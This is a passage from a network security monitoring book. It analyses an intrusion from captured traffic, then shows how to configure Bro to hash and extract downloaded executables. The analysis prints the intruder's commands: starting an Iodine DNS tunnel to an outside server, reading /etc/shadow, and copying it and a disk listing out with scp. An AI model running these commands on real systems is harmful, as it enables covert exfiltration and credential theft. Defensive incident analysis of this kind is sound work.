- en: using the *practicalnsm.com* domain. (I wonder who caused this intrusion?)
  prefs: []
  type: TYPE_NORMAL
- en: Because the attacker initiates Iodine in this manner, it looks like the victim,
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99, will communicate directly with an Iodine server at 203.0.113.8\.
  prefs: []
  type: TYPE_NORMAL
- en: (There is no need to communicate with a DNS server when Iodine is run in
  prefs: []
  type: TYPE_NORMAL
- en: this manner, but the covert traffic will still appear as DNS.)
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....54112282595894012391779534721588........2......'
  prefs: []
  type: TYPE_NORMAL
- en: ./...4**iodine -r** **203.0.113.8 practicalnsm.com**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-24: Iodine tool startup*'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-25 likely shows output received from the Iodine server. We
  prefs: []
  type: TYPE_NORMAL
- en: see that the server IP address is 10.10.0.1, which tells us that there is a
    VPN
  prefs: []
  type: TYPE_NORMAL
- en: sort of channel between 10.0.0.99 and 203.0.113.8\. Now the two computers
  prefs: []
  type: TYPE_NORMAL
- en: can communicate with each other via IP addresses like 10.10.0.1 for the
  prefs: []
  type: TYPE_NORMAL
- en: server, rather than 203.0.113.8\. (The Iodine tool encapsulates the intruder’s
  prefs: []
  type: TYPE_NORMAL
- en: communications in DNS traffic.)
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ....................core_channel_write....)....'
  prefs: []
  type: TYPE_NORMAL
- en: WXQSRQPTXGMIWNZFNDHOHWTCFEJDDKUF................2.......:...4**Server tunnel
    IP is 10.10.0.1**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-25: Output from the Iodine server*'
  prefs: []
  type: TYPE_NORMAL
- en: To test connectivity, the intruder uses the ping utility to contact 10.10.0.1,
  prefs: []
  type: TYPE_NORMAL
- en: the IP address at the other end of the tunnel, as shown in Listing 11-26\. The
  prefs: []
  type: TYPE_NORMAL
- en: remote system replies, and the tunnel is working. An NSM sensor will not
  prefs: []
  type: TYPE_NORMAL
- en: see ICMP traffic, but it will start seeing odd DNS activity.
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ...............2...........4**ping -c** 3 **10.10.0.1**'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ....................core_channel_write....)....BGCEPMSGLBOFCPOHKXSKOAMVWVCRDKFU.'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2.......:...4**PING 10.10.0.1 (10.10.0.1) 56(84) bytes of
    data.**'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ...........2........core_channel_write....)....GSFTPZWPJXAREZEXEEALKFUBCUSRLPEK.'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2.......A...464 bytes from 10.10.0.1: icmp_req=1 ttl=64
    time=2.07 ms SRC: ...........9........core_channel_write....)....MUNJGYKCWWYETWKFZOWTIVKVAQNLKNCQ.'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2.......A...464 bytes from 10.10.0.1: icmp_req=2 ttl=64
    time=1.15 ms SRC: ...........9........core_channel_write....)....JLCWSBHPCCBTZFUVTJUYBYQVUOXEZPPF.'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..Q...........2...........464 bytes from 10.10.0.1: icmp_req=3 ttl=64
    time=1.12 ms SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: --- 10.10.0.1 ping statistics ---'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: 3 packets transmitted, 3 received, 0% packet loss, time 2003ms'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: rtt min/avg/max/mdev = 1.128/1.453/2.073/0.439 ms'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-26: Ping test for tunnel connectivity*'
  prefs: []
  type: TYPE_NORMAL
- en: '**258** Chapter 11'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '***Enumerating the Victim***'
  prefs: []
  type: TYPE_NORMAL
- en: Now the intruder turns to enumerating the victim. He prints the output of
  prefs: []
  type: TYPE_NORMAL
- en: the */etc/shadow* file, which contains password hashes. Listing 11-27 shows
  prefs: []
  type: TYPE_NORMAL
- en: part of this file.
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: root@intubu32:~# ....................core_channel_write....)....'
  prefs: []
  type: TYPE_NORMAL
- en: LBTPOVHNRBVNFEXWLPWAAXXSYKEYJQMW.
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...|............core_channel_write....)....76703429583552950498014447957238........2......'
  prefs: []
  type: TYPE_NORMAL
- en: '.....4**cat /etc/shadow**'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ............'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..d............core_channel_write....)....76703429583552950498014447957238...............'
  prefs: []
  type: TYPE_NORMAL
- en: '..........'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ...............2...........4cat /etc/shadow'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: root:!:15773:0:99999:7:::'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: daemon:*:15749:0:99999:7:::'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: bin:*:15749:0:99999:7:::'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: sys:*:15749:0:99999:7:::'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: sync:*:15749:0:99999:7:::'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: games:*:15749:0:99999:7:::'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: man:*:15749:0:99999:7:::'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: lp:*:15749:0:99999:7:::'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-27: Contents of the* /etc/shadow *file*'
  prefs: []
  type: TYPE_NORMAL
- en: As shown in Listing 11-28, the intruder uses scp to copy the */etc/shadow*
  prefs: []
  type: TYPE_NORMAL
- en: file to 10.10.0.1, the server on the other side of the Iodine covert channel.
  prefs: []
  type: TYPE_NORMAL
- en: He connects as user raybourque and copies the file to Ray’s home directory.
  prefs: []
  type: TYPE_NORMAL
- en: His password is Bru1ns. I like this guy. (Note that by using scp, the transfer
    is
  prefs: []
  type: TYPE_NORMAL
- en: encrypted within the DNS covert channel.)
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2.......@...4**scp /etc/shadow raybourque@10.10.0.1:/home/raybourque/**'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...s............core_channel_write....)....12979532812626493965961252667084........2......'
  prefs: []
  type: TYPE_NORMAL
- en: '.....4**Bru1ns**'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: **shadow** 100% 1121 1.1KB/s 00:00'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-28: Copying the* /etc/shadow *file*'
  prefs: []
  type: TYPE_NORMAL
- en: The intruder next creates a recursive directory listing of the entire hard
  prefs: []
  type: TYPE_NORMAL
- en: drive and puts the contents in a file titled *intubu32.ls-alR.txt*, as shown
    in Listing 11-29\.
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....67917540968083609031577076644751........2....'
  prefs: []
  type: TYPE_NORMAL
- en: '...(...4**ls -alR / > intubu32.ls-alR.txt**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-29: Creating a recursive directory listing of the hard drive*'
  prefs: []
  type: TYPE_NORMAL
- en: After creating the file, the intruder again uses scp to transfer it to his
  prefs: []
  type: TYPE_NORMAL
- en: server as user raybourque, as shown in Listing 11-30\.
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **259**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2...........4**scp intubu32.ls-alR.txt raybourque@10.10.0.1:/home/raybourque**
    **SRC: <32.ls-alR.txt** raybourque@10.10.0.1:/home/raybourque'
  prefs: []
  type: TYPE_NORMAL
- en: '........................./'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ....................core_channel_write....)....USSCEEVDBIGFIRWOSESCHCUWSDAZFPJS.'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..u...........2...........4Password:....................core_channel_write....)....'
  prefs: []
  type: TYPE_NORMAL
- en: GUTYMDXFGXQWFPYSCFKMNPZTQEKYHWYC.
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...s............core_channel_write....)....56606769242836968330355877691782........2......'
  prefs: []
  type: TYPE_NORMAL
- en: '.....4Bru1ns'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-30: Transfer of hard drive file listing to intruder’s server*'
  prefs: []
  type: TYPE_NORMAL
- en: That’s the end of the transcript.
  prefs: []
  type: TYPE_NORMAL
- en: '***Summarizing Stage 2***'
  prefs: []
  type: TYPE_NORMAL
- en: In the second half of this intrusion, the intruder, still operating from
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15, used stolen credentials to connect via SSH from 172.16.0.37
  prefs: []
  type: TYPE_NORMAL
- en: to 10.0.0.9\. He copied a DNS covert tunnel tool to the second victim and
  prefs: []
  type: TYPE_NORMAL
- en: configured it to speak to a new intruder system at 203.0.113.8\. The intruder
  prefs: []
  type: TYPE_NORMAL
- en: activated the covert tunnel, and we saw that it communicated via DNS
  prefs: []
  type: TYPE_NORMAL
- en: requests and replies. Within the covert tunnel, the intruder copied sensitive
  prefs: []
  type: TYPE_NORMAL
- en: data enumerated from the second victim, 10.0.0.9\. Figure 11-18 summarizes
  prefs: []
  type: TYPE_NORMAL
- en: these actions.
  prefs: []
  type: TYPE_NORMAL
- en: 1\. Intruder pivots from Victim 1 to Victim 2\.
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 1
  prefs: []
  type: TYPE_NORMAL
- en: Victim 1
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37
  prefs: []
  type: TYPE_NORMAL
- en: Victim 2
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99
  prefs: []
  type: TYPE_NORMAL
- en: 2\. Intruder installs DNS covert tunnel tool and creates
  prefs: []
  type: TYPE_NORMAL
- en: channel to second intruder system (Intruder 2).
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 2
  prefs: []
  type: TYPE_NORMAL
- en: Victim 2
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.8
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99
  prefs: []
  type: TYPE_NORMAL
- en: 3\. Within covert tunnel, intruder copies sensitive
  prefs: []
  type: TYPE_NORMAL
- en: data from Victim 2 to Intruder 2\.
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 2
  prefs: []
  type: TYPE_NORMAL
- en: Victim 2
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.8
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-18: A summary of stage 2 of the server-side compromise*'
  prefs: []
  type: TYPE_NORMAL
- en: '**260** Chapter 11'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 145](index-295_1.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '**conclusion**'
  prefs: []
  type: TYPE_NORMAL
- en: Our review of this chapter’s example showed that the intruder was very
  prefs: []
  type: TYPE_NORMAL
- en: active on the original victim, 172.16.0.37, and used information gathered
  prefs: []
  type: TYPE_NORMAL
- en: from that system to pivot to 10.0.0.99\. The initial review of NSM data out-
  prefs: []
  type: TYPE_NORMAL
- en: lined the broad story of the intrusion, but examining the command-and-
  prefs: []
  type: TYPE_NORMAL
- en: control channel helped fill in some blanks. Thanks to the NSM platform
  prefs: []
  type: TYPE_NORMAL
- en: capturing full packet data, the Vivian’s Pets CIRT knows what happened
  prefs: []
  type: TYPE_NORMAL
- en: to the two systems on its network.
  prefs: []
  type: TYPE_NORMAL
- en: This example of a client-side compromise began with an innocent
  prefs: []
  type: TYPE_NORMAL
- en: search on Twitter and concluded with two compromised machines and a
  prefs: []
  type: TYPE_NORMAL
- en: covert channel carrying sensitive information outside the company. Our
  prefs: []
  type: TYPE_NORMAL
- en: network-centric approach answered many questions about the course of the
  prefs: []
  type: TYPE_NORMAL
- en: intrusion, but it also showed that in some ways, the CIRT got lucky. If the
  prefs: []
  type: TYPE_NORMAL
- en: command-and-control channel between 203.0.113.15 and 172.16.0.37 had
  prefs: []
  type: TYPE_NORMAL
- en: been encrypted, the CIRT would not have learned critical details about
  prefs: []
  type: TYPE_NORMAL
- en: the intrusion. For that reason, it’s useful to have host-centric forensics and
  prefs: []
  type: TYPE_NORMAL
- en: investigation techniques ready if possible, but that’s a topic for someone
  prefs: []
  type: TYPE_NORMAL
- en: else’s book!
  prefs: []
  type: TYPE_NORMAL
- en: Speaking of Twitter, the analysts do have some information about
  prefs: []
  type: TYPE_NORMAL
- en: the source of the attack. Threat agents are humans who might make bad
  prefs: []
  type: TYPE_NORMAL
- en: choices. Defenders can sometimes capitalize on these bad choices to better
  prefs: []
  type: TYPE_NORMAL
- en: understand the threat and defend the network. In the case of this intrusion,
  prefs: []
  type: TYPE_NORMAL
- en: several hours after the covert channel died, the tweet shown in Figure 11-19
  prefs: []
  type: TYPE_NORMAL
- en: appeared. Pay attention to the bottom of the figure where the tweet’s text
  prefs: []
  type: TYPE_NORMAL
- en: appears.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-19: Last tweet from* Callbackpnsm'
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **261**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: This tweet is a combination of text and a picture. The tweet says
  prefs: []
  type: TYPE_NORMAL
- en: “@ubu32pnsm Thanks for checking out the healthcare update. One of
  prefs: []
  type: TYPE_NORMAL
- en: 'us is #winning. pic.twitter.com/mD4y6eIiqF.” The picture, shown in Fig-'
  prefs: []
  type: TYPE_NORMAL
- en: ure 11-19, appears to be a screen capture of an Ubuntu desktop; in fact, it
  prefs: []
  type: TYPE_NORMAL
- en: shows the victim user’s system. She is logged in to Twitter as user Ubu32pnsm.
  prefs: []
  type: TYPE_NORMAL
- en: Two Firefox browser tabs are open. The second tab shows part of the URL
  prefs: []
  type: TYPE_NORMAL
- en: for the phony *healthcarenews* website on 203.0.113.15\. This intruder thinks
  prefs: []
  type: TYPE_NORMAL
- en: he’s a funny guy, but personalized messages like this could be his undoing.
  prefs: []
  type: TYPE_NORMAL
- en: In order to not get caught, attackers also need to practice sound opera-
  prefs: []
  type: TYPE_NORMAL
- en: tional security.
  prefs: []
  type: TYPE_NORMAL
- en: '**262** Chapter 11'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**12**'
  prefs: []
  type: TYPE_NORMAL
- en: '**e x T e N D i N g S o**'
  prefs: []
  type: TYPE_NORMAL
- en: So far, we’ve been working with the default
  prefs: []
  type: TYPE_NORMAL
- en: installation of SO. This chapter introduces
  prefs: []
  type: TYPE_NORMAL
- en: a few ways to extend it. You just need to edit
  prefs: []
  type: TYPE_NORMAL
- en: a few configuration files and download some
  prefs: []
  type: TYPE_NORMAL
- en: external content to get more from your SO setup.
  prefs: []
  type: TYPE_NORMAL
- en: To move beyond the “stock” SO installation, we’ll look at three ways to
  prefs: []
  type: TYPE_NORMAL
- en: 'leverage additional functionality provided by the Bro suite:'
  prefs: []
  type: TYPE_NORMAL
- en: • Use the MD5 hashes logged by Bro with the website VirusTotal or other
  prefs: []
  type: TYPE_NORMAL
- en: third-party analysis engines.
  prefs: []
  type: TYPE_NORMAL
- en: • Configure Bro to extract binaries from network traffic, so that you can
  prefs: []
  type: TYPE_NORMAL
- en: submit those artifacts to third-party analysis engines.
  prefs: []
  type: TYPE_NORMAL
- en: • Integrate external intelligence from Mandiant’s APT1 report with Bro
  prefs: []
  type: TYPE_NORMAL
- en: to generate alert data.
  prefs: []
  type: TYPE_NORMAL
- en: The chapter concludes with an example that shows how SO reports and
  prefs: []
  type: TYPE_NORMAL
- en: extracts the download of a malicious binary.
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**using bro to Track executables**'
  prefs: []
  type: TYPE_NORMAL
- en: When trying to defend an enterprise, CIRTs can benefit by knowing which
  prefs: []
  type: TYPE_NORMAL
- en: executables users are downloading over the network. Usually, these exe-
  prefs: []
  type: TYPE_NORMAL
- en: cutables are benign tools or packages that people need to do their jobs, but
  prefs: []
  type: TYPE_NORMAL
- en: sometimes they’re malicious software. Bro can help you to discover the sorts
  prefs: []
  type: TYPE_NORMAL
- en: of executables people are downloading in order to protect them from harm.
  prefs: []
  type: TYPE_NORMAL
- en: '***Hashing Downloaded Executables with Bro***'
  prefs: []
  type: TYPE_NORMAL
- en: By default, the version of Bro shipped with SO calculates an MD5 hash (a
  prefs: []
  type: TYPE_NORMAL
- en: cryptographic representation of a file’s contents) for every executable down-
  prefs: []
  type: TYPE_NORMAL
- en: loaded via HTTP. These hash values can help us track the executables
  prefs: []
  type: TYPE_NORMAL
- en: downloaded by users. For example, Listing 12-1 shows how Bro tracks execut-
  prefs: []
  type: TYPE_NORMAL
- en: able downloads. The *notice.log* file records data about hashes that Bro gener-
  prefs: []
  type: TYPE_NORMAL
- en: ates when it sees executables transferred over HTTP.
  prefs: []
  type: TYPE_NORMAL
- en: 2013-04-12T13:33:47+0000 mBNkJTlLBfa 192.168.2.108 49630 23.62.236.50 80
  prefs: []
  type: TYPE_NORMAL
- en: 1 GET download.cdn.mozilla.net /pub/mozilla.org/firefox/releases/20.0.1/
  prefs: []
  type: TYPE_NORMAL
- en: win32/en-US/Firefox Setup 20.0.1.exeu http://www.mozilla.org/en-US/products/download.
  prefs: []
  type: TYPE_NORMAL
- en: html?product=firefox-20.0&os=win&lang=en-US Mozilla/5.0 (Windows NT 6.1; WOW64;
    rv:19.0) Gecko/20100101 Firefox/19.0 0 21036128 200 OK - -
  prefs: []
  type: TYPE_NORMAL
- en: '- (empty) - -- application/x-dosexecv 1e39efe30b02fd96b10785b49e23913bw'
  prefs: []
  type: TYPE_NORMAL
- en: '-'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-1: Bro* http .log *entry for download of Firefox binary*'
  prefs: []
  type: TYPE_NORMAL
- en: You can see the download of *Firefox Setup 20.0.1.exe* u, a file of type
  prefs: []
  type: TYPE_NORMAL
- en: application/x-dosexec v, with the hash 1e39efe30b02fd96b10785b49e23913b w.
  prefs: []
  type: TYPE_NORMAL
- en: By default, Bro reports when it hashes executables and writes an event to
  prefs: []
  type: TYPE_NORMAL
- en: the Bro *notice.log* file, as shown in Listing 12-2\.
  prefs: []
  type: TYPE_NORMAL
- en: 2013-04-12T13:34:01+0000 mBNkJTlLBfa 192.168.2.108 49630 23.62.236.50
  prefs: []
  type: TYPE_NORMAL
- en: 80 tcp HTTP::MD5v 192.168.2.108 1e39efe30b02fd96b10785b49e23913b http://
  prefs: []
  type: TYPE_NORMAL
- en: download.cdn.mozilla.net/pub/mozilla.org/firefox/releases/20.0.1/win32/en-US/Firefox
  prefs: []
  type: TYPE_NORMAL
- en: Setup 20.0.1.exeu 1e39efe30b02fd96b10785b49e23913bw 192.168.2.108 23.62.236.50
  prefs: []
  type: TYPE_NORMAL
- en: 80 - sov-eth0-1 Notice::ACTION_LOG 6 3600.000000 F
  prefs: []
  type: TYPE_NORMAL
- en: '- - - - - -- -'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-2: Bro* notice .log *entry for MD5 calculation*'
  prefs: []
  type: TYPE_NORMAL
- en: Here, you see the download of *Firefox Setup 20.0.1.exe* u, with Bro’s rec-
  prefs: []
  type: TYPE_NORMAL
- en: ognition that this is an HTTP and requires MD5 hashing v and a match-
  prefs: []
  type: TYPE_NORMAL
- en: ing hash 1e39efe30b02fd96b10785b49e23913b w. You can use third-party sources
  prefs: []
  type: TYPE_NORMAL
- en: with the hash to get more information about this download.
  prefs: []
  type: TYPE_NORMAL
- en: '***Submitting a Hash to VirusTotal***'
  prefs: []
  type: TYPE_NORMAL
- en: VirusTotal ( *http://www.virustotal.com/*) is a popular online resource for
  prefs: []
  type: TYPE_NORMAL
- en: learning more about binaries. In addition to submitting actual files, users
  prefs: []
  type: TYPE_NORMAL
- en: can also submit hashes of binaries to VirusTotal to see if those hashes are
  prefs: []
  type: TYPE_NORMAL
- en: '**264** Chapter 12'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 146](index-299_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 147](index-299_2.png)'
  prefs: []
  type: TYPE_IMG
- en: present in the VirusTotal database. If a previous user has already uploaded
  prefs: []
  type: TYPE_NORMAL
- en: a binary with the same hash to VirusTotal, a search for that hash should
  prefs: []
  type: TYPE_NORMAL
- en: reveal what VirusTotal knows about the binary submitted earlier.
  prefs: []
  type: TYPE_NORMAL
- en: To see this functionality at work, we’ll submit the hash logged by Bro
  prefs: []
  type: TYPE_NORMAL
- en: from Listing 12-1, as shown in Figure 12-1\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 12-1: Submit ing the observed MD5 hash to VirusTotal*'
  prefs: []
  type: TYPE_NORMAL
- en: Within a few seconds, we see results like those shown in Figure 12-2\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 12-2: VirusTotal results for the submit ed MD5 hash*'
  prefs: []
  type: TYPE_NORMAL
- en: VirusTotal has a match for this hash (notice the four angels), and no
  prefs: []
  type: TYPE_NORMAL
- en: antivirus engines have detected the binary as malicious, as shown in the
  prefs: []
  type: TYPE_NORMAL
- en: Detection Ratio field.
  prefs: []
  type: TYPE_NORMAL
- en: The Additional Information tab offers more data on the binaries that
  prefs: []
  type: TYPE_NORMAL
- en: VirusTotal has seen with the matching MD5 hash, as shown in Listing 12-3\.
  prefs: []
  type: TYPE_NORMAL
- en: First seen by VirusTotal
  prefs: []
  type: TYPE_NORMAL
- en: 2013-04-10 22:10:23 UTC ( 6 days, 20 hours ago )
  prefs: []
  type: TYPE_NORMAL
- en: Last seen by VirusTotal
  prefs: []
  type: TYPE_NORMAL
- en: 2013-04-17 15:29:15 UTC ( 3 hours, 8 minutes ago )
  prefs: []
  type: TYPE_NORMAL
- en: File names (max. 25)
  prefs: []
  type: TYPE_NORMAL
- en: '**Firefox_Setup_20.0.1.exe**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Firefox Setup 20.0.1.exe**'
  prefs: []
  type: TYPE_NORMAL
- en: Extending SO **265**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: test.exe
  prefs: []
  type: TYPE_NORMAL
- en: 7zS.sfx.exe
  prefs: []
  type: TYPE_NORMAL
- en: Firefox_Setup_20.0.1GB32.exe
  prefs: []
  type: TYPE_NORMAL
- en: TtfjHao4.exe.part
  prefs: []
  type: TYPE_NORMAL
- en: '**Firefox_Setup_20.0.1.exe**'
  prefs: []
  type: TYPE_NORMAL
- en: 7zS.sfx
  prefs: []
  type: TYPE_NORMAL
- en: file-5362262_exe
  prefs: []
  type: TYPE_NORMAL
- en: Firefox%20Setup%2020.0.1.exe
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-3: First seen, last seen, and filename information from VirusTotal*'
  prefs: []
  type: TYPE_NORMAL
- en: As highlighted in bold, names referencing Firefox setup ( *Firefox_*
  prefs: []
  type: TYPE_NORMAL
- en: '*Setup_20.0.1.exe*) are the same as the binary we observed in our Bro logs,'
  prefs: []
  type: TYPE_NORMAL
- en: but others, like file-5362262_exe, are completely different.
  prefs: []
  type: TYPE_NORMAL
- en: This analysis is helpful, but not conclusive. It would be better to have
  prefs: []
  type: TYPE_NORMAL
- en: copies of the binaries themselves, not just their hashes. We could do more
  prefs: []
  type: TYPE_NORMAL
- en: analysis with the original artifacts.
  prefs: []
  type: TYPE_NORMAL
- en: '**using bro to extract binaries from Traffic**'
  prefs: []
  type: TYPE_NORMAL
- en: By default, Bro with SO logs MD5 hashes of binaries downloaded over
  prefs: []
  type: TYPE_NORMAL
- en: HTTP, but it does not extract the binaries and save them to disk. It’s easy
  prefs: []
  type: TYPE_NORMAL
- en: to configure Bro to take these actions, however, but we do need to be care-
  prefs: []
  type: TYPE_NORMAL
- en: ful not to overwhelm the sensor with the extracted binaries. To reduce that
  prefs: []
  type: TYPE_NORMAL
- en: potential problem, we’ll tell Bro to extract Windows executables downloaded
  prefs: []
  type: TYPE_NORMAL
- en: over HTTP and FTP only.
  prefs: []
  type: TYPE_NORMAL
- en: '***Configuring Bro to Extract Binaries from Traffic***'
  prefs: []
  type: TYPE_NORMAL
- en: Bro inspects traffic and generates logs based on the *policy scripts* that ship
    with the default installation. Policy scripts are the ways analysts use the *Bro*
  prefs: []
  type: TYPE_NORMAL
- en: '*network programming language* (a term popularized by Liam Randall) to tell'
  prefs: []
  type: TYPE_NORMAL
- en: the Bro engine what to do with the traffic it sees.
  prefs: []
  type: TYPE_NORMAL
- en: Bro reports what it finds using logfiles and messages that it creates
  prefs: []
  type: TYPE_NORMAL
- en: using its *notice framework*. (You’re encouraged to leave the default scripts
  prefs: []
  type: TYPE_NORMAL
- en: alone, and to make changes to the policy scripts found in the */opt/bro/share/*
  prefs: []
  type: TYPE_NORMAL
- en: '*bro/site/* directory.)'
  prefs: []
  type: TYPE_NORMAL
- en: To reconfigure Bro to extract Windows executables downloaded over
  prefs: []
  type: TYPE_NORMAL
- en: HTTP and FTP, we start by creating a place to store extracted content with
  prefs: []
  type: TYPE_NORMAL
- en: 'this command:'
  prefs: []
  type: TYPE_NORMAL
- en: $ **sudo mkdir -p /nsm/bro/extracted/http/ /nsm/bro/extracted/ftp/**
  prefs: []
  type: TYPE_NORMAL
- en: Next, we create a copy of the *local.bro* policy script for safekeeping.
  prefs: []
  type: TYPE_NORMAL
- en: $ **sudo cp /opt/bro/share/bro/site/local.bro** **/opt/bro/share/bro/site/local.bro.orig**
    **266** Chapter 12
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Now we edit the *local.bro* file. (I’m using the vi editor, but use any editor
    you like, such as the Leafpad program bundled with SO.)
  prefs: []
  type: TYPE_NORMAL
- en: $ **sudo vi /opt/bro/share/bro/site/local.bro**
  prefs: []
  type: TYPE_NORMAL
- en: Listing 12-4 shows the content to add at the very bottom of the *local.bro*
    file.
  prefs: []
  type: TYPE_NORMAL
- en: Extract EXEs
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: redef HTTP::extract_file_types += /application\/x-dosexec/;u
  prefs: []
  type: TYPE_NORMAL
- en: redef FTP::extract_file_types += /application\/x-dosexec/;v
  prefs: []
  type: TYPE_NORMAL
- en: Extract files to /nsm/bro/extracted/
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: redef HTTP::extraction_prefix = "/nsm/bro/extracted/http/http-item";
  prefs: []
  type: TYPE_NORMAL
- en: redef FTP::extraction_prefix = "/nsm/bro/extracted/ftp/ftp-file";
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-4: Additions to the end of the* local .bro *file that enable Windows
    executable* *extraction for HTTP and FTP*'
  prefs: []
  type: TYPE_NORMAL
- en: If you wanted Bro to extract executables from Simple Mail Transfer
  prefs: []
  type: TYPE_NORMAL
- en: Protocol (SMTP) as well, you could add more lines similar to those in
  prefs: []
  type: TYPE_NORMAL
- en: Listing 12-4, replacing HTTP with SMTP. Support for extracting binaries from
  prefs: []
  type: TYPE_NORMAL
- en: Internet Relay Chat (IRC) is possible using the same method. To extract
  prefs: []
  type: TYPE_NORMAL
- en: more than Windows executables, you could alter u and v so that the
  prefs: []
  type: TYPE_NORMAL
- en: 'application portions read as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: /application\/.*/;
  prefs: []
  type: TYPE_NORMAL
- en: Replacing x-dosexec with .* tells Bro to extract any application type it
  prefs: []
  type: TYPE_NORMAL
- en: recognizes. You should not run this sort of configuration in production
  prefs: []
  type: TYPE_NORMAL
- en: because you could overload your sensor as it tries to rebuild and write every-
  prefs: []
  type: TYPE_NORMAL
- en: thing Bro recognizes. Use /application\/.*/; only to process saved traces
  prefs: []
  type: TYPE_NORMAL
- en: with limited amounts of traffic.
  prefs: []
  type: TYPE_NORMAL
